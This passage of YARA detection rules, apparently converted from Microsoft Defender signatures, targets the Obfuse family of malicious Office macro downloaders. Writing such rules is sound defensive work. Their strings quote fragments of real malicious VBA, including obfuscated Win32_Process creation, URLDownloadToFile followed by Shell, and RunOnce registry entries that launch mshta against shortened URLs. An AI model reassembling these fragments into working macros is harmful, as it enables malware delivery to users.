    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LT!MTB"
        threat_id = "2147743125"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 3a 35 33 77 3a 35 33 69 3a 35 33 6e 6d 3a 35 33 67 6d 74 73 3a 57 3a 35 33 69 6e 3a 35 33 33 3a 35 33 32 5f 3a 35 33 50 72 6f 3a 35 33 63 65 3a 35 33 73 3a 35 33 73 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-20] 2c 20 52 65 70 6c 61 63 65 28 22 3a 75 71 77 68 64 73 61 64 35 75 71 77 68 64 73 61 64 33 22 2c 20 22 75 71 77 68 64 73 61 64 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LU_2147743126_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LU!MTB"
        threat_id = "2147743126"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-20] 2c 20 4e 75 6c 6c 2c 20 [0-20] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 43 68 72 28 41 73 63 28 4d 69 64 28 [0-48] 2c 20 [0-16] 2c 20 31 29 29 20 2d}  //weight: 1, accuracy: Low
        $x_1_4 = "(\"64\")" ascii //weight: 1
        $x_1_5 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-22] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LW_2147743153_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LW!MTB"
        threat_id = "2147743153"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-20] 28 22 77 3a 35 33 3a 35 33 69 3a 35 33 3a 35 33 3a 35 33 6e 3a 35 33 6d 3a 35 33 67 3a 35 33 3a 35 33 6d 74 3a 35 33 73 3a 3a 35 33 3a 35 33 3a 35 33 57 69 3a 35 33 6e 33 32 3a 35 33 3a 35 33 5f 50 72 3a 35 33 3a 35 33 6f 63 65 3a 35 33 73 73 22 29 29 2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 28 [0-20] 2c 20 52 65 70 6c 61 63 65 28 22 6f 79 71 67 75 77 65 64 3a 6f 79 71 67 75 77 65 64 35 6f 79 71 67 75 77 65 64 33 6f 79 71 67 75 77 65 64 22 2c 20 22 6f 79 71 67 75 77 65 64 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LZ_2147743176_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LZ!MTB"
        threat_id = "2147743176"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-48] 28 22 71 77 75 68 64 77 71 77 75 68 64 69 71 77 75 68 64 6e 6d 71 77 75 68 64 67 6d 74 73 3a 57 71 77 75 68 64 69 6e 71 77 75 68 64 33 71 77 75 68 64 32 5f 71 77 75 68 64 50 72 6f 71 77 75 68 64 63 65 71 77 75 68 64 73 71 77 75 68 64 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-48] 2c 20 52 65 70 6c 61 63 65 28 22 76 73 78 64 61 71 76 73 78 64 61 77 76 73 78 64 61 75 76 73 78 64 61 68 76 73 78 64 61 64 76 73 78 64 61 22 2c 20 22 76 73 78 64 61 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 68 6f 77 57 69 6e 64 6f 77 ?? 20 3d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MB_2147743186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MB!MTB"
        threat_id = "2147743186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 65 67 57 72 69 74 65 20 22 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 52 75 6e 4f 6e 63 65 5c 22 2c 20 22 22 22 6d 22 20 2b 20 22 73 22 20 2b 20 22 68 22 20 2b 20 22 74 22 20 2b 20 22 61 22 22 22 22 68 74 74 70 73 3a 5c 5c 62 69 74 2e 6c 79 2f [0-30] 22 22 22 2c 20 22 52 45 47 5f 53 5a 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub Auto_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MB_2147743186_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MB!MTB"
        threat_id = "2147743186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 30 29 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_3 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_4 = {43 61 6c 6c 20 [0-21] 2e 4f 70 65 6e 28 [0-21] 2e 43 6f 6e 74 72 6f 6c 73 28 31 29 2e 56 61 6c 75 65 29}  //weight: 1, accuracy: Low
        $x_1_5 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_7 = ".Close" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MC_2147743211_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MC!MTB"
        threat_id = "2147743211"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 22 71 77 75 68 64 77 71 77 75 68 64 69 71 77 75 68 64 6e 71 77 75 68 64 6d 71 77 75 68 64 67 6d 74 73 3a 71 77 75 68 64 57 69 6e 33 71 77 75 68 64 32 5f 50 71 77 75 68 64 72 6f 71 77 75 68 64 63 65 73 71 77 75 68 64 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 52 65 70 6c 61 63 65 28 22 54 67 6b 67 75 69 55 71 54 67 6b 67 75 69 55 77 54 67 6b 67 75 69 55 75 54 67 6b 67 75 69 55 68 54 67 6b 67 75 69 55 64 22 2c 20 22 54 67 6b 67 75 69 55 22 2c 20 22 22 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 68 6f 77 57 69 6e 64 6f 77 ?? 20 3d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MD_2147743212_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MD!MTB"
        threat_id = "2147743212"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-32] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 46 75 6e 63 74 69 6f 6e 20 [0-32] 20 4c 69 62 20 22 6c 69 62 63 2e 64 79 6c 69 62 22 20 41 6c 69 61 73 20 22 73 79 73 74 65 6d 22}  //weight: 1, accuracy: Low
        $x_1_4 = ".Open" ascii //weight: 1
        $x_1_5 = ".Send" ascii //weight: 1
        $x_1_6 = "Next" ascii //weight: 1
        $x_1_7 = "= ActiveDocument." ascii //weight: 1
        $x_1_8 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MH_2147743237_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MH!MTB"
        threat_id = "2147743237"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 22 68 6f 77 6b 6d 77 68 6f 77 6b 6d 69 6e 6d 68 6f 77 6b 6d 67 6d 68 6f 77 6b 6d 74 73 3a 57 68 6f 77 6b 6d 69 6e 33 68 6f 77 6b 6d 32 5f 50 68 6f 77 6b 6d 72 68 6f 77 6b 6d 6f 63 65 68 6f 77 6b 6d 73 73 68 6f 77 6b 6d 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c 20 22 68 6f 77 6b 6d 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 53 68 6f 77 57 69 6e 64 6f 77 ?? 20 3d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MK_2147743270_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MK!MTB"
        threat_id = "2147743270"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Nbuejw(meuhw)" ascii //weight: 1
        $x_1_2 = ".Text, JKMNNe2.Text, 874, \"nujneg53\"" ascii //weight: 1
        $x_1_3 = "URLDownloadToFile 0, miiwthb33, mnwuiubh22, 0, 0" ascii //weight: 1
        $x_1_4 = "Shell meuhw" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MM_2147743281_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MM!MTB"
        threat_id = "2147743281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-12] 2c 20 [0-12] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "(UserForm1.Label1.Caption)" ascii //weight: 1
        $x_1_3 = ".Environment(\"process\").Item(\"param1\") =" ascii //weight: 1
        $x_1_4 = ".run \"cmd /c call %param1%\", 2" ascii //weight: 1
        $x_1_5 = "= \"21232f297a57a5a743894a0e4a801fc3\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MM_2147743281_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MM!MTB"
        threat_id = "2147743281"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Environ$(\"USERPROFILE\") &" ascii //weight: 1
        $x_1_2 = {28 22 53 65 6c 65 63 74 20 2a 20 66 72 6f 6d 20 [0-37] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".CopyHere ShellApp.Namespace(Full_fILE).Items" ascii //weight: 1
        $x_1_4 = ".CopyHere ShellAppzz.Namespace(Pathzz).Items" ascii //weight: 1
        $x_1_5 = "Put #1," ascii //weight: 1
        $x_1_6 = {53 68 65 6c 6c 28 [0-8] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_7 = {3d 20 53 70 6c 69 74 28 42 74 2c 20 22 [0-1] 22 29}  //weight: 1, accuracy: Low
        $x_1_8 = {4f 70 65 6e 20 [0-18] 20 46 6f 72 20 42 69 6e 61 72 79 20 41 63 63 65 73 73 20 57 72 69 74 65 20 41 73 20 23 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (7 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MO_2147743320_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MO!MTB"
        threat_id = "2147743320"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 22 69 77 71 68 77 6c 73 61 77 69 77 71 68 77 6c 73 61 69 6e 6d 69 77 71 68 77 6c 73 61 67 6d 69 77 71 68 77 6c 73 61 74 73 3a 57 69 77 71 68 77 6c 73 61 69 6e 33 69 77 71 68 77 6c 73 61 32 5f 50 69 77 71 68 77 6c 73 61 72 69 77 71 68 77 6c 73 61 6f 63 65 69 77 71 68 77 6c 73 61 73 73 69 77 71 68 77 6c 73 61 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "MSForms, TextBox\"" ascii //weight: 1
        $x_1_5 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MQ_2147743323_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MQ!MTB"
        threat_id = "2147743323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_2 = "dwReserved" ascii //weight: 1
        $x_1_3 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 [0-10] 2c 20 [0-10] 2c 20 30 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_4 = "Sheets(Gert).Range(Byytuity)" ascii //weight: 1
        $x_1_5 = "Sheets(\"Files\").Range(\"B60\")" ascii //weight: 1
        $x_1_6 = "http://" ascii //weight: 1
        $x_1_7 = "If VBA7 Then" ascii //weight: 1
        $x_1_8 = "If Win64 Then" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MQ_2147743323_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MQ!MTB"
        threat_id = "2147743323"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Private Declare PtrSafe Function ShvtE Lib \"shell32\" Alias \"ShellExecuteW\" (ByVal xLXGo As LongPtr," ascii //weight: 1
        $x_1_3 = "Call ShvtE(0, StrPtr(\"oPeN\"), StrPtr(Split(Zfdbsdrgsreg.Unsjkfse84583754.Tag," ascii //weight: 1
        $x_1_4 = ".Tag, ChrW$(32))(0)))), StrPtr(\"\"), 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MR_2147743325_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MR!MTB"
        threat_id = "2147743325"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 77 22 20 2b 20 [0-53] 28 22 69 6e 50 69 64 6f 72 6d 50 69 64 6f 72 67 6d 50 69 22 20 2b 20 22 64 6f 72 74 73 50 69 64 6f 72 3a 50 69 64 6f 72 57 50 69 64 6f 72 69 6e 50 69 64 22 20 2b 20 22 6f 72 33 50 69 64 6f 72 32 50 69 64 6f 72 5f 50 69 64 6f 72 50 22 20 2b 20 22 72 50 69 64 6f 72 6f 50 69 64 6f 72 50 69 64 6f 72 63 65 50 69 64 6f 72 73 50 69 64 6f 72 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {28 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e [0-64] 20 2b 20 54 68 69 73 44 6f 63 75 6d 65 6e 74 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MS_2147743331_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MS!MTB"
        threat_id = "2147743331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 22 71 77 6c 68 6c 73 61 64 77 71 77 6c 68 6c 73 61 64 69 6e 6d 71 77 6c 68 6c 73 61 64 67 6d 71 77 6c 68 6c 73 61 64 74 73 3a 57 71 77 6c 68 6c 73 61 64 69 6e 33 71 77 6c 68 6c 73 61 64 32 5f 50 71 77 6c 68 6c 73 61 64 72 71 77 6c 68 6c 73 61 64 6f 63 65 71 77 6c 68 6c 73 61 64 73 73 71 77 6c 68 6c 73 61 64 22 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "MSForms, TextBox\"" ascii //weight: 1
        $x_1_5 = ".ShowWindow =" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MS_2147743331_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MS!MTB"
        threat_id = "2147743331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function pkkkk() As String" ascii //weight: 1
        $x_1_2 = "pdas1 = \"s\"" ascii //weight: 1
        $x_1_3 = "pdas2 = \"h\"" ascii //weight: 1
        $x_1_4 = "pdas3 = \"t\" + \"a ht\"" ascii //weight: 1
        $x_1_5 = "ko4d = \"tp://%748237%728748@j.mp/\"" ascii //weight: 1
        $x_1_6 = "pdas0 = \"m\"" ascii //weight: 1
        $x_1_7 = "okffr = \"aksdjwodowhdiqwd\"" ascii //weight: 1
        $x_1_8 = "pkkkk = pdas0 + pdas1 + pdas2 + pdas3 + ko4d + okffr" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_2147743333_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MT!MTB"
        threat_id = "2147743333"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MT: an internal category used to refer to some threats"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Declare PtrSafe Function SetTimer Lib \"user32\" (ByVal hWnd As LongPtr," ascii //weight: 1
        $x_1_2 = "Put #1, , ThisDocument.DefaultTargetFrame & \"s.com/LEO5GDKZCP.png'," ascii //weight: 1
        $x_1_3 = "'C:\\PsiContent\\PSxoep1.exe')\"" ascii //weight: 1
        $x_1_4 = "& \".bat\"" ascii //weight: 1
        $x_1_5 = "Selection.TypeText Text:=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MU_2147743357_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MU!MTB"
        threat_id = "2147743357"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 4c 65 6e 28}  //weight: 1, accuracy: Low
        $x_1_2 = "+ \"w139i139n139mg139mts139:Wi139n32139_Pr139oce139ss\"))" ascii //weight: 1
        $x_1_3 = "\"w66i66n66mg66mts66:Wi66n3266_Pr66oce66ss\"))" ascii //weight: 1
        $x_1_4 = "+ \"w156i156n156mg156mts156:Wi156n32156_Pr156oce156ss\"))" ascii //weight: 1
        $x_1_5 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_7 = "MSForms, TextBox\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MW_2147743362_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MW!MTB"
        threat_id = "2147743362"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 43 53 74 72 28 4c 65 6e 28}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 77 [0-4] 69 [0-4] 6e [0-4] 6d 67 [0-4] 6d 74 73 [0-4] 3a 57 69 [0-4] 6e [0-6] 5f 50 72 [0-4] 6f 63 65 [0-4] 73 73 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 72 65 61 74 65 28 [0-56] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 52 65 70 6c 61 63 65 28 [0-53] 2c}  //weight: 1, accuracy: Low
        $x_1_5 = ", MSForms, TextBox\"" ascii //weight: 1
        $x_1_6 = "Sub autoopen()" ascii //weight: 1
        $x_1_7 = "'https://www." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_MY_2147743367_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.MY!MTB"
        threat_id = "2147743367"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
